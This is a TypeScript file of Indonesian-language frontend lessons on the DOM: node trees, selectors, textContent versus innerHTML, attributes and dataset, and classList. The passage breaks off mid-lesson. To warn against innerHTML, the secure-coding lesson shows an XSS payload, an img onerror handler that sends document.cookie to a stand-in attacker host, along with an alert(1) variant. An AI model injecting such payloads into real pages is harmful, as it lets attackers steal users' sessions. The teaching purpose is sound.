import {
  callout,
  checklist,
  code,
  divider,
  h2,
  ol,
  p,
  playground,
  references,
  table,
  terms,
  ul,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Frontend Basic — Chapter 4, all thirteen lessons.
 *
 * This chapter is what makes React comprehensible later: everything React automates is done by
 * hand here first, so the reader knows what is being automated and why it is worth it.
 */
export const lessons: LessonDraft[] = [
  written(
    'apa-itu-dom',
    'Apa itu DOM & Pohon Node',
    9,
    'HTML sebagai struktur pohon yang bisa dibaca dan diubah dari kode.',
    [
      p(
        'Browser tidak menyimpan halamanmu sebagai teks HTML. Saat memuat, ia mengurai teks itu menjadi **pohon objek** — dan objek itulah yang dirender, diubah, dan dibaca JavaScript. Pohon itu disebut DOM (Document Object Model).',
      ),

      terms(
        {
          term: 'DOM',
          meaning:
            'Singkatan *Document Object Model*, dibaca "dom", terjemahannya **model objek dokumen**. Perlu diluruskan sejak awal: browser **tidak** menyimpan halamanmu sebagai teks HTML. Saat memuat, ia mengurai teks itu menjadi **pohon objek**, dan objek itulah yang digambar ke layar serta dibaca JavaScript. Mengubah DOM berarti mengubah pohon itu — teks HTML aslinya tidak pernah ikut berubah.',
        },
        {
          term: 'node',
          meaning:
            'Dibaca "nod", terjemahannya **simpul**. Satu titik di dalam pohon DOM. Yang sering mengejutkan: **teks pun sebuah node**, begitu juga komentar HTML. Karena itu jumlah "anak" sebuah elemen sering lebih banyak daripada yang terlihat mata — spasi dan baris baru di antara tag ikut terhitung.',
        },
        {
          term: 'element',
          meaning:
            'Jenis node yang berasal dari sebuah tag HTML: `<h1>`, `<p>`, `<div>`. Semua element adalah node, tapi **tidak semua node adalah element**. Pembedaan ini yang menjelaskan kenapa ada `childNodes` (semua node) dan `children` (hanya element) — dan kenapa keduanya sering memberi jumlah berbeda.',
        },
        {
          term: 'text node',
          meaning:
            'Node yang isinya teks murni, ditandai `#text` pada diagram pohon. Setiap potongan teks di antara tag punya node-nya sendiri. Inilah yang membuat `element.childNodes.length` kadang bernilai 3 padahal secara visual hanya ada satu tag di dalamnya.',
        },
        {
          term: 'document',
          meaning:
            'Objek yang menjadi **akar** seluruh pohon DOM sekaligus pintu masuk untuk mengaksesnya dari JavaScript. Semua pencarian elemen berangkat dari sini: `document.querySelector(...)`. Ia hanya ada di browser — di Node.js memanggilnya menghasilkan `ReferenceError`, seperti dibahas di Sub-bab 1.1.',
        },
        {
          term: 'parse',
          meaning:
            'Artinya **membedah teks menjadi struktur bermakna**. Proses browser membaca HTML dari atas ke bawah lalu menyusun pohon DOM. Karena berjalan dari atas ke bawah, skrip yang mencari elemen sebelum elemennya sempat diurai akan menemukan `null` — alasan atribut `defer` ada.',
        },
        {
          term: 'render',
          meaning:
            'Artinya **menggambar ke layar**. Tahap setelah parse, ketika browser mengubah pohon DOM ditambah aturan CSS menjadi piksel yang terlihat. Membedakan keduanya penting: mengubah DOM tidak otomatis berarti layar langsung berubah pada saat itu juga.',
        },
        {
          term: 'API',
          meaning:
            'Kumpulan perintah siap pakai. Dalam bab ini yang dimaksud adalah **DOM API** — sekumpulan method dan property seperti `querySelector`, `textContent`, dan `addEventListener` yang disediakan browser untuk membaca dan mengubah pohon itu.',
        },
        {
          term: 'pohon',
          meaning:
            'Terjemahan dari *tree*. Struktur data berbentuk cabang dengan satu akar, di mana tiap simpul boleh punya banyak anak tapi hanya satu induk. Kosakata keluarga dipakai konsisten sepanjang bab ini: *parent* (induk), *child* (anak), *sibling* (saudara), *descendant* (keturunan).',
        },
      ),

      h2('Dari teks ke pohon'),
      code(
        'html',
        `
        <body>
          <h1 class="judul">Halo</h1>
          <p>Isi <strong>penting</strong></p>
        </body>
        `,
      ),
      code(
        'text',
        `
        document
        └── html
            └── body
                ├── h1.judul
                │   └── #text "Halo"
                └── p
                    ├── #text "Isi "
                    └── strong
                        └── #text "penting"
        `,
        { caption: 'Teks pun sebuah node — ini menjelaskan beberapa perilaku yang tampak aneh.' },
      ),

      h2('Jenis node yang perlu kamu tahu'),
      table(
        ['Jenis', 'Contoh', 'Catatan'],
        [
          ['Element', '`<div>`, `<p>`', 'Yang biasanya kamu maksud'],
          ['Text', '`"Halo"`, spasi, baris baru', 'Termasuk indentasi di HTML-mu'],
          ['Comment', '`<!-- -->`', 'Ikut ada di pohon'],
          ['Document', '`document`', 'Akar pohon'],
        ],
      ),
      code(
        'js',
        `
        const p = document.querySelector('p');

        p.childNodes.length;   // 2 — text node "Isi " DAN element <strong>
        p.children.length;     // 1 — hanya element

        // Hampir selalu kamu ingin 'children', bukan 'childNodes'.
        `,
      ),
      callout(
        'info',
        'DOM bukan HTML sumbermu',
        'Yang kamu lihat di tab Elements adalah keadaan **saat ini**, bukan berkas aslinya. Browser juga memperbaiki HTML yang salah (menutup tag yang lupa ditutup) dan JavaScript bisa mengubahnya kapan saja. "View source" menampilkan berkas; Elements menampilkan DOM.',
      ),

      h2('Kapan DOM siap'),
      code(
        'js',
        `
        // Skrip di <head> tanpa defer -> DOM belum ada
        document.querySelector('h1');   // null

        // Tiga solusi, dari yang terbaik:
        // 1. <script type="module" src="...">   — otomatis ditunda
        // 2. <script defer src="...">
        // 3. Taruh <script> tepat sebelum </body>

        // Kalau terpaksa:
        document.addEventListener('DOMContentLoaded', () => {
          document.querySelector('h1');   // sekarang ada
        });
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'DOM adalah pohon objek hasil parsing HTML — bukan teks HTML itu sendiri.',
        'Spasi dan baris baru menjadi text node; `children` mengabaikannya, `childNodes` tidak.',
        'DOM mencerminkan keadaan sekarang, bukan berkas sumber.',
        '`type="module"` atau `defer` menjamin DOM sudah ada saat skrip berjalan.',
      ),
      references(
        {
          label: 'Introduction to the DOM',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction',
          source: 'MDN',
          note: 'Pengantar resmi: apa itu DOM, kenapa ia pohon, dan hubungannya dengan HTML sumber.',
        },
        {
          label: 'Node',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node',
          source: 'MDN',
          note: 'Daftar seluruh jenis node, termasuk text node dan comment node yang sering terlupakan.',
        },
        {
          label: 'Document',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document',
          source: 'MDN',
          note: 'Akar pohon sekaligus pintu masuk seluruh DOM API yang dipakai sepanjang bab ini.',
        },
        {
          label: 'Node.childNodes',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/childNodes',
          source: 'MDN',
          note: 'Menegaskan bahwa spasi dan baris baru ikut terhitung — beda dari `children`.',
        },
        {
          label: 'DOM Standard',
          href: 'https://dom.spec.whatwg.org/',
          source: 'WHATWG',
          note: 'Spesifikasi aslinya, sumber kebenaran untuk perilaku yang dibahas di seluruh bab ini.',
        },
      ),
    ],
  ),

  written(
    'seleksi-elemen',
    'Menyeleksi Elemen',
    10,
    'Menemukan elemen yang ingin kamu ubah — dan menghindari jebakan koleksi hidup.',
    [
      terms(
        {
          term: 'selector',
          meaning:
            'Dibaca "se-lek-tor", terjemahannya **penyeleksi** atau pola pencari. Teks pola yang menjelaskan elemen mana yang kamu cari, memakai tata bahasa yang **sama persis dengan CSS**: `.kartu` untuk class, `#menu` untuk id, `input[type="email"]` untuk atribut. Keuntungan besarnya: kalau kamu sudah bisa menulis CSS, kamu sudah bisa mencari elemen.',
        },
        {
          term: 'querySelector',
          meaning:
            'Gabungan *query* (menanyakan) dan *selector*. Mencari elemen **pertama** yang cocok dengan pola, atau `null` kalau tidak ada. Yang perlu diwaspadai: salah ketik selector **tidak melempar error apa pun** — ia hanya memberi `null`, dan errornya baru muncul di baris berikutnya dengan pesan yang membingungkan.',
        },
        {
          term: 'querySelectorAll',
          meaning:
            'Mencari **semua** elemen yang cocok dan mengembalikannya sebagai `NodeList`. Kalau tidak ada yang cocok, hasilnya `NodeList` kosong — bukan `null`. Karena itu memanggilnya lalu langsung mem-`forEach` selalu aman, tidak seperti `querySelector`.',
        },
        {
          term: 'NodeList',
          meaning:
            'Kumpulan node hasil pencarian. **Mirip array tapi bukan array**: ia punya `length` dan `forEach`, tapi tidak punya `map`, `filter`, maupun `reduce`. Untuk memakainya, ubah dulu jadi array asli dengan `Array.from(...)` atau spread `[...]`.',
        },
        {
          term: 'HTMLCollection',
          meaning:
            'Jenis kumpulan lain yang dikembalikan API lama seperti `getElementsByClassName`. Bahkan lebih terbatas daripada `NodeList` — ia **tidak punya `forEach` sama sekali**. Ini salah satu alasan `querySelectorAll` lebih dianjurkan.',
        },
        {
          term: 'koleksi hidup',
          meaning:
            'Terjemahan dari *live collection*. Kumpulan yang **ikut berubah otomatis** ketika DOM berubah — menambah elemen baru membuat isinya bertambah dengan sendirinya. Terdengar praktis, tapi berbahaya di dalam loop: menghapus elemen sambil menelusurinya membuat indeks bergeser dan sebagian elemen terlewat.',
        },
        {
          term: 'koleksi statis',
          meaning:
            'Kebalikannya: potret sesaat yang **tidak ikut berubah** setelah dibuat. `querySelectorAll` mengembalikan yang statis, dan justru itulah yang membuatnya aman dipakai di dalam loop.',
        },
        {
          term: 'akar pencarian',
          meaning:
            'Titik awal pencarian. `document.querySelector(...)` mencari di seluruh halaman, sementara `kartu.querySelector(...)` mencari **hanya di dalam** elemen `kartu`. Membatasi akar membuat pencarian lebih cepat sekaligus lebih tahan terhadap elemen bernama sama di bagian lain halaman.',
        },
        {
          term: 'el',
          meaning:
            'Singkatan *element*, nama variabel yang lazim dipakai untuk menampung hasil seleksi. Seperti `fn` dan `arr`, ini kebiasaan penamaan — bukan kata kunci.',
        },
      ),

      h2('Yang perlu kamu pakai'),
      code(
        'js',
        `
        document.querySelector('.kartu');          // elemen PERTAMA yang cocok, atau null
        document.querySelectorAll('.kartu');       // NodeList semua yang cocok
        document.getElementById('menu');           // paling cepat, tapi hanya untuk id

        // Selector CSS apa pun berlaku
        document.querySelector('#daftar > li:first-child');
        document.querySelector('[data-status="aktif"]');
        document.querySelector('input[type="email"]');
        `,
      ),
      callout(
        'warning',
        '`querySelector` mengembalikan `null`, bukan error',
        'Salah ketik selector tidak melempar apa-apa — kamu baru tahu saat baris berikutnya melempar `Cannot read properties of null`. Untuk elemen yang wajib ada, periksa dan lempar error yang menjelaskan.',
      ),
      code(
        'js',
        `
        function wajibAda(selector, akar = document) {
          const el = akar.querySelector(selector);
          if (!el) throw new Error(\`Elemen tidak ditemukan: \${selector}\`);
          return el;
        }
        `,
      ),

      h2('Menyeleksi di dalam elemen, bukan seluruh dokumen'),
      code(
        'js',
        `
        const kartu = document.querySelector('.kartu');

        // SALAH: mencari di SELURUH halaman — bisa dapat tombol kartu lain
        const tombol = document.querySelector('.tombol');

        // BENAR: dibatasi ke dalam kartu ini
        const tombol2 = kartu.querySelector('.tombol');
        `,
      ),

      h2('NodeList bukan array'),
      code(
        'js',
        `
        const semua = document.querySelectorAll('.kartu');

        semua.forEach((el) => el.remove());   // forEach: ADA
        semua.map((el) => el.id);             // TypeError — map tidak ada

        [...semua].map((el) => el.id);        // ubah jadi array dulu
        Array.from(semua).filter(...);
        `,
      ),

      h2('Koleksi hidup vs statis — jebakan nyata'),
      code(
        'js',
        `
        const hidup  = document.getElementsByClassName('item');   // HIDUP
        const statis = document.querySelectorAll('.item');        // STATIS

        // Awalnya ada 3 item
        hidup.length;    // 3
        statis.length;   // 3

        document.querySelector('.item').remove();

        hidup.length;    // 2 — ikut berubah sendiri
        statis.length;   // 3 — potret saat dipanggil
        `,
      ),
      callout(
        'danger',
        'Loop atas koleksi hidup yang menghapus elemen akan melewati separuhnya',
        'Setiap penghapusan menggeser indeks koleksi hidup, sementara indeks loop terus maju. Untuk `getElementsByClassName`, salin dulu ke array (`[...koleksi]`), atau pakai `querySelectorAll` yang statis.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`querySelector` untuk satu, `querySelectorAll` untuk banyak — keduanya menerima selector CSS.',
        '`querySelector` mengembalikan `null` diam-diam; periksa untuk elemen yang wajib ada.',
        'Seleksi di dalam elemen induk, bukan seluruh dokumen.',
        'NodeList punya `forEach` tapi bukan array — sebar dengan `[...]` untuk `map`/`filter`.',
        '`getElementsBy*` menghasilkan koleksi hidup; salin dulu sebelum memodifikasi sambil me-loop.',
      ),
      references(
        {
          label: 'Document.querySelector()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector',
          source: 'MDN',
          note: 'Menegaskan bahwa hasilnya `null` ketika tidak ada yang cocok — bukan error.',
        },
        {
          label: 'Document.querySelectorAll()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll',
          source: 'MDN',
          note: 'Termasuk penegasan bahwa `NodeList` yang dikembalikannya bersifat statis.',
        },
        {
          label: 'NodeList',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/NodeList',
          source: 'MDN',
          note: 'Perbedaan NodeList hidup dan statis, beserta daftar method yang benar-benar dimilikinya.',
        },
        {
          label: 'HTMLCollection',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection',
          source: 'MDN',
          note: 'Koleksi hidup dari `getElementsBy*` — dasar jebakan loop di sub-bab ini.',
        },
        {
          label: 'CSS selectors',
          href: 'https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_selectors',
          source: 'MDN',
          note: 'Seluruh tata bahasa selector yang bisa dipakai — sama persis dengan yang berlaku di CSS.',
        },
      ),
    ],
  ),

  written(
    'mengubah-konten',
    '`textContent` vs `innerHTML` vs `innerText`',
    12,
    'Tiga cara mengisi konten — dan satu di antaranya adalah celah keamanan.',
    [
      terms(
        {
          term: 'textContent',
          meaning:
            'Property yang membaca atau mengisi isi sebuah elemen sebagai **teks apa adanya**. Kalau kamu mengisinya dengan `"<b>halo</b>"`, yang muncul di layar adalah tulisan `<b>halo</b>` itu sendiri, bukan huruf tebal. Justru sifat "tidak menafsirkan" inilah yang membuatnya **aman** — dan ia juga yang paling murah dari ketiganya.',
        },
        {
          term: 'innerHTML',
          meaning:
            'Property yang mengisi elemen dengan **mem-parse isinya sebagai HTML sungguhan**, sehingga tag di dalamnya benar-benar menjadi elemen. Ini yang membuatnya berguna sekaligus berbahaya: begitu isinya berasal dari pengguna, kamu membuka celah XSS. Aturan yang dipakai project ini: jangan pernah dipakai untuk data yang tidak kamu tulis sendiri.',
        },
        {
          term: 'innerText',
          meaning:
            'Mirip `textContent` tapi **memperhitungkan CSS**: teks pada elemen yang disembunyikan dengan `display: none` tidak ikut terbaca, dan spasi dirapikan mengikuti tampilan. Konsekuensinya ia jauh lebih mahal, karena browser harus menghitung tata letak dulu sebelum bisa menjawab.',
        },
        {
          term: 'XSS',
          meaning:
            'Singkatan *Cross-Site Scripting*. Celah keamanan ketika data dari pengguna dirender sebagai HTML atau skrip, sehingga penyerang bisa **menjalankan kodenya sendiri di browser korban** — mencuri sesi, mengubah tampilan, atau mengirim data keluar. Ini bukan ancaman teoretis; ia konsisten masuk daftar kerentanan paling umum versi OWASP.',
        },
        {
          term: 'sanitasi',
          meaning:
            'Dari *sanitize*, artinya **membersihkan**. Membuang tag dan atribut berbahaya dari HTML sebelum ia dirender. Perlu ditegaskan: **jangan pernah menulis penyaring sendiri** — daftar hal berbahaya jauh lebih panjang dan lebih kreatif daripada dugaan siapa pun. Pakai pustaka yang memang dirawat untuk itu.',
        },
        {
          term: 'payload',
          meaning:
            'Artinya **muatan**. Dalam konteks keamanan, potongan data yang sengaja disusun penyerang untuk memicu perilaku yang tidak diinginkan — misalnya `<img src=x onerror=alert(1)>` yang menjalankan kode meski tidak ada tag `<script>` sama sekali.',
        },
        {
          term: 'escape',
          meaning:
            'Artinya **melarikan** atau menetralkan. Mengubah karakter bermakna khusus menjadi bentuk amannya, misalnya `<` menjadi `&lt;`. `textContent` melakukannya secara otomatis untukmu, dan itulah mekanisme sebenarnya di balik keamanannya.',
        },
        {
          term: 'reflow',
          meaning:
            'Perhitungan ulang tata letak halaman oleh browser. Disebut di sini karena `innerText` **memaksa reflow** untuk bisa menjawab — itulah sumber biayanya. Dibahas tuntas di Sub-bab 4.12.',
        },
      ),

      h2('Perbedaannya'),
      table(
        ['Property', 'Menafsirkan HTML?', 'Memperhitungkan CSS?', 'Biaya'],
        [
          ['`textContent`', 'Tidak — teks apa adanya', 'Tidak', 'Murah'],
          ['`innerHTML`', '**Ya** — mem-parse jadi elemen', 'Tidak', 'Mahal'],
          ['`innerText`', 'Tidak', '**Ya** — memicu perhitungan layout', 'Paling mahal'],
        ],
      ),
      code(
        'js',
        `
        el.textContent = '<b>tebal</b>';
        // Menampilkan literal: <b>tebal</b>

        el.innerHTML = '<b>tebal</b>';
        // Menampilkan: tebal (huruf tebal sungguhan)
        `,
      ),

      h2('Kenapa `innerHTML` berbahaya'),
      code(
        'js',
        `
        // Komentar dari pengguna:
        const komentar = '<img src=x onerror="fetch(\\'https://penyerang/?c=\\'+document.cookie)">';

        el.innerHTML = komentar;
        // Gambar gagal dimuat -> onerror berjalan -> cookie sesi terkirim ke penyerang.
        // Ini XSS, dan tidak butuh tag <script> sama sekali.
        `,
      ),
      callout(
        'danger',
        'Aturan yang tidak bisa ditawar',
        '**Data yang berasal dari pengguna tidak pernah boleh masuk ke `innerHTML`.** Termasuk nama, komentar, hasil pencarian, pesan error, dan apa pun dari API — karena API itu sendiri menerima input dari seseorang. Pakai `textContent`.',
      ),
      code(
        'js',
        `
        // AMAN — dirender sebagai teks, apa pun isinya
        el.textContent = komentar;

        // Kalau HTML memang WAJIB (misalnya konten dari editor):
        // sanitasi dulu dengan pustaka yang teruji, jangan menyaring sendiri.
        import DOMPurify from 'dompurify';
        el.innerHTML = DOMPurify.sanitize(htmlDariEditor);
        `,
      ),

      h2('`innerHTML` juga merusak yang sudah ada'),
      code(
        'js',
        `
        // Menghancurkan seluruh isi lalu membangun ulang:
        //   - event listener pada elemen lama hilang
        //   - fokus keyboard hilang
        //   - nilai input yang sedang diketik hilang
        //   - posisi scroll bisa lompat
        wadah.innerHTML += '<li>baru</li>';   // JANGAN — mem-parse ulang SEMUANYA

        // Menambahkan tanpa merusak yang lain:
        wadah.append(buatItem('baru'));
        `,
      ),

      h2('Kapan `innerText` berbeda'),
      code(
        'js',
        `
        // <p>Terlihat <span style="display:none">tersembunyi</span></p>
        p.textContent;   // 'Terlihat tersembunyi'
        p.innerText;     // 'Terlihat'   — menghormati CSS

        // innerText memaksa browser menghitung layout dulu.
        // Di dalam loop, ini penyebab lambat yang sering tidak disadari.
        `,
      ),

      h2('Menyisipkan HTML dengan aman: `insertAdjacentHTML`'),
      code(
        'js',
        `
        // Menyisipkan tanpa mem-parse ulang isi yang sudah ada
        wadah.insertAdjacentHTML('beforeend', '<li>baru</li>');

        // Posisi: 'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'
        // TETAP tidak boleh dipakai untuk data pengguna — ia tetap mem-parse HTML.
        `,
      ),

      divider,
      h2('Rangkuman'),
      ul(
        '`textContent` adalah default. Pakai yang lain hanya kalau ada alasan jelas.',
        'Data pengguna di `innerHTML` = XSS, tanpa perlu tag `<script>`.',
        '`innerHTML +=` mem-parse ulang seluruh isi dan menghapus listener, fokus, serta nilai input.',
        '`innerText` memperhitungkan CSS dan memaksa perhitungan layout — paling mahal.',
        'Kalau HTML memang wajib, sanitasi dengan pustaka teruji.',
      ),
      references(
        {
          label: 'Node.textContent',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent',
          source: 'MDN',
          note: 'Bagian "Differences from innerText" merangkum ketiga property yang dibandingkan di sini.',
        },
        {
          label: 'Element.innerHTML',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML',
          source: 'MDN',
          note: 'Halaman ini sendiri memuat peringatan keamanan resmi tentang data dari pengguna.',
        },
        {
          label: 'Element.insertAdjacentHTML()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML',
          source: 'MDN',
          note: 'Menyisipkan tanpa mem-parse ulang isi yang sudah ada — tetap bukan untuk data pengguna.',
        },
        {
          label: 'Cross Site Scripting Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Panduan pencegahan XSS yang mendasari seluruh peringatan di sub-bab ini.',
        },
        {
          label: 'Content Security Policy (CSP)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP',
          source: 'MDN',
          note: 'Lapisan pertahanan kedua yang membatasi dampak XSS bila ada yang lolos.',
        },
      ),
    ],
  ),

  written(
    'atribut-property-dataset',
    'Atribut, Property & `dataset`',
    10,
    'Dua dunia yang mirip tapi tidak sama — dan kenapa nilai input sering tidak sesuai dugaan.',
    [
      p(
        '**Atribut** adalah yang tertulis di HTML. **Property** adalah yang ada di objek DOM. Saat halaman dimuat, atribut dipakai untuk mengisi property — tapi setelah itu keduanya bisa berpisah.',
      ),

      terms(
        {
          term: 'atribut',
          meaning:
            'Dari *attribute*. Yang **tertulis di dalam tag HTML**: `<input value="awal">`. Sifatnya selalu berupa **teks**, apa pun isinya — bahkan `disabled` yang terasa seperti boolean sebenarnya hanya teks kosong. Atribut mencerminkan **keadaan awal** halaman, bukan keadaan sekarang.',
        },
        {
          term: 'property',
          meaning:
            'Yang ada di **objek DOM** hasil parsing: `input.value`. Tipenya bisa apa saja — teks, angka, boolean, bahkan objek. Ia mencerminkan **keadaan sekarang**, dan inilah yang hampir selalu kamu butuhkan.',
        },
        {
          term: 'refleksi',
          meaning:
            'Dari *reflection*. Hubungan dua arah antara sebagian atribut dan property-nya: mengubah salah satu ikut mengubah yang lain. Yang perlu dihafal justru **pengecualiannya** — `value`, `checked`, dan `selected` **berhenti saling mencerminkan** begitu pengguna berinteraksi dengan elemennya. Di situlah sumber bug "form mengirim nilai lama".',
        },
        {
          term: 'defaultValue',
          meaning:
            'Property yang **tetap** mencerminkan atribut `value` di HTML, berapa pun kali pengguna mengetik. Pasangannya untuk checkbox adalah `defaultChecked`. Berguna saat kamu ingin mengembalikan form ke keadaan semula.',
        },
        {
          term: 'getAttribute / setAttribute',
          meaning:
            'Method untuk membaca dan menulis **atribut**, bukan property. Perlu diingat: hasilnya selalu teks, dan untuk `value` maupun `checked` ia memberi keadaan awal — bukan yang sedang dilihat pengguna.',
        },
        {
          term: 'data-*',
          meaning:
            'Atribut khusus yang boleh kamu karang sendiri asalkan diawali `data-`, misalnya `data-status="aktif"`. Ini **satu-satunya cara resmi** menempelkan data buatanmu ke sebuah elemen tanpa melanggar standar HTML.',
        },
        {
          term: 'dataset',
          meaning:
            'Property yang mengumpulkan semua atribut `data-*` sebuah elemen menjadi satu objek. Perhatikan perubahan penamaannya: `data-jumlah-item` di HTML menjadi `el.dataset.jumlahItem` di JavaScript — tanda hubung hilang dan huruf berikutnya menjadi kapital.',
        },
        {
          term: 'className',
          meaning:
            'Nama property untuk atribut `class`. Namanya berbeda karena `class` sudah menjadi **kata kunci JavaScript** sejak awal, sehingga tidak boleh dipakai sebagai nama property. Kejanggalan sejarah yang sama juga melahirkan `htmlFor` untuk atribut `for`.',
        },
        {
          term: 'boolean attribute',
          meaning:
            'Atribut yang **maknanya ditentukan oleh ada-tidaknya**, bukan oleh nilainya — `disabled`, `checked`, `required`. Menulis `disabled="false"` justru tetap menonaktifkan elemennya, karena yang dibaca browser adalah keberadaan atributnya. Untuk mengubahnya dari JavaScript, pakai property-nya: `el.disabled = false`.',
        },
      ),

      h2('Perbedaan yang paling sering menggigit'),
      code('html', `<input id="nama" value="awal">`),
      code(
        'js',
        `
        const input = document.querySelector('#nama');

        // Pengguna mengetik "Zum" ke dalam input
        input.value;                    // 'Zum'    — property: nilai SEKARANG
        input.getAttribute('value');    // 'awal'   — atribut: nilai AWAL di HTML

        input.defaultValue;             // 'awal'   — property yang mencerminkan atribut
        `,
      ),
      callout(
        'warning',
        'Selalu pakai `.value`, bukan `getAttribute("value")`',
        'Ini bug yang membuat form mengirim nilai lama. Aturan yang sama berlaku untuk `checked`, `selected`, dan `disabled` — semuanya punya versi atribut (keadaan awal) dan versi property (keadaan sekarang).',
      ),
      code(
        'js',
        `
        checkbox.checked;                    // true/false — keadaan sekarang
        checkbox.getAttribute('checked');    // '' atau null — hanya keadaan AWAL
        `,
      ),

      h2('`class` vs `className`'),
      code(
        'js',
        `
        el.className;                  // string penuh — 'kartu aktif besar'
        el.getAttribute('class');      // sama
        el.classList;                  // API yang sebaiknya kamu pakai (sub-bab berikutnya)
        `,
      ),

      h2('Kapan memakai atribut'),
      code(
        'js',
        `
        // Untuk atribut kustom dan ARIA, property-nya tidak ada — pakai setAttribute
        el.setAttribute('aria-expanded', 'true');
        el.setAttribute('role', 'dialog');
        el.removeAttribute('hidden');
        el.hasAttribute('disabled');    // true/false

        // Atribut boolean: yang menentukan adalah ADA atau TIDAK, bukan nilainya
        el.setAttribute('disabled', 'false');   // TETAP DISABLED — jebakan klasik
        el.removeAttribute('disabled');         // baru benar-benar aktif
        el.disabled = false;                    // atau lewat property
        `,
      ),

      h2('`data-*` dan `dataset`'),
      code('html', `<button data-id="42" data-status-kirim="menunggu">Kirim</button>`),
      code(
        'js',
        `
        const btn = document.querySelector('button');

        btn.dataset.id;            // '42'        — SELALU string
        btn.dataset.statusKirim;   // 'menunggu'  — data-status-kirim jadi camelCase

        btn.dataset.id = '43';                    // menulis
        Number(btn.dataset.id);                   // 43 — ubah sendiri kalau butuh angka

        delete btn.dataset.statusKirim;           // menghapus atributnya
        `,
      ),
      callout(
        'tip',
        '`data-*` menghubungkan DOM ke datamu',
        'Pola yang akan kamu pakai terus di sub-bab event delegation: satu listener di wadah, lalu `event.target.closest("[data-id]").dataset.id` untuk tahu baris mana yang diklik. Jangan simpan objek besar di sana — cukup identitasnya.',
      ),

      divider,
      h2('Rangkuman'),
      ul(
        'Atribut = keadaan awal di HTML; property = keadaan sekarang di objek DOM.',
        'Untuk `value`, `checked`, `selected`, `disabled` — selalu pakai property.',
        'Atribut boolean ditentukan keberadaannya, bukan nilainya.',
        'ARIA dan atribut kustom dipakai lewat `setAttribute`.',
        '`dataset` selalu mengembalikan string; `data-status-kirim` menjadi `dataset.statusKirim`.',
      ),
      references(
        {
          label: 'Attributes and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute',
          source: 'MDN',
          note: 'Menegaskan bahwa nilai atribut selalu teks, apa pun tipe property pasangannya.',
        },
        {
          label: 'HTMLElement.dataset',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset',
          source: 'MDN',
          note: 'Aturan penerjemahan nama: `data-status-kirim` menjadi `dataset.statusKirim`.',
        },
        {
          label: 'Using data attributes',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Solve_HTML_problems/Use_data_attributes',
          source: 'MDN',
          note: 'Cara resmi menempelkan data buatanmu ke elemen tanpa melanggar standar HTML.',
        },
        {
          label: 'HTMLInputElement.value',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/value',
          source: 'MDN',
          note: 'Sumber perbedaan `value` dan `defaultValue` — inti jebakan "form mengirim nilai lama".',
        },
        {
          label: 'Boolean attributes',
          href: 'https://html.spec.whatwg.org/multipage/common-microsyntaxes.html#boolean-attributes',
          source: 'WHATWG HTML',
          note: 'Aturan resmi bahwa maknanya ditentukan keberadaannya, bukan nilainya.',
        },
      ),
    ],
  ),

  written(
    'class-dan-style',
    'Class & Style: `classList`, CSS variable',
    10,
    'Mengubah tampilan tanpa menaburkan style inline ke seluruh kode.',
    [
      terms(
        {
          term: 'classList',
          meaning:
            'Property yang memperlakukan atribut `class` sebagai **daftar yang bisa diutak-atik satu per satu**, bukan sebagai satu untai teks panjang. Inilah sebabnya ia jauh lebih aman daripada `className`: menambah satu class tidak berisiko menghapus class lain yang sudah ada di sana.',
        },
        {
          term: 'toggle',
          meaning:
            'Artinya **membalik keadaan**. `classList.toggle("terbuka")` menambah class kalau belum ada dan menghapusnya kalau sudah ada. Bentuk keduanya jauh lebih berguna: `toggle("error", !valid)` **memaksa** sesuai boolean, dan itu menggantikan empat baris `if`/`else` tanpa kemungkinan lupa cabang sebaliknya.',
        },
        {
          term: 'style inline',
          meaning:
            'Style yang ditulis langsung pada elemen lewat `el.style.warna = ...`, bukan lewat berkas CSS. Ia menang atas hampir semua aturan CSS, dan justru itulah masalahnya: begitu ditaburkan dari JavaScript, tidak ada lagi satu tempat untuk mengetahui tampilan sebenarnya sebuah elemen.',
        },
        {
          term: 'CSS variable',
          meaning:
            'Disebut juga *custom property*. Nilai yang kamu definisikan sendiri di CSS dengan awalan dua tanda hubung: `--warna-utama: #8f5314`. Keunggulannya untuk JavaScript besar — kamu cukup mengubah **satu variabel**, dan semua aturan CSS yang memakainya ikut berubah, tanpa perlu menyentuh style tiap elemen.',
        },
        {
          term: 'setProperty',
          meaning:
            'Method untuk menulis CSS variable dari JavaScript: `el.style.setProperty("--warna", "red")`. Wajib memakai method ini, karena nama berawalan `--` tidak bisa ditulis dengan notasi titik biasa.',
        },
        {
          term: 'getComputedStyle',
          meaning:
            'Fungsi yang mengembalikan nilai CSS yang **benar-benar berlaku** pada sebuah elemen setelah semua aturan diperhitungkan — bukan hanya yang ditulis inline. Perlu diwaspadai: memanggilnya **memaksa browser menghitung tata letak**, sehingga mahal kalau dipakai di dalam loop.',
        },
        {
          term: 'design token',
          meaning:
            'Nilai desain yang dikunci di satu tempat dan dipakai ulang di mana-mana — warna, spasi, radius sudut. Website yang sedang kamu baca ini memakai pola tersebut lewat CSS variable, dan aturan projectnya melarang menulis nilai warna langsung di komponen.',
        },
        {
          term: 'separation of concerns',
          meaning:
